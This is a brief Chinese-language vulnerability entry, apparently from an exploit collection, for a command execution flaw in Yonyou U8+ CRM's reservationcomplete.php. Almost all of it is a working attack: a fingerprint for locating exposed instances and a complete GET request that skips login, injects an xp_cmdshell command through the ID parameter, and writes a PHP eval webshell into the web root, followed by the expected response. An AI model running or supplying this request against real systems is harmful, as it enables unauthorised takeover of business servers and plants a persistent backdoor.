# 用友U8+CRM接口reservationcomplete存在命令执行漏洞

用友 ｜ 命令执行 ｜ —
- **指纹**：`body="/js/tfunction.js"`
- **请求**：`GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27echo%20^%3C?php%20@eval($_POST[x]);?^%3E%20%3E%20D:\U8SOFT\turbocrm70\code\www\shell.php%27; HTTP/1.1`
- **响应特征**：200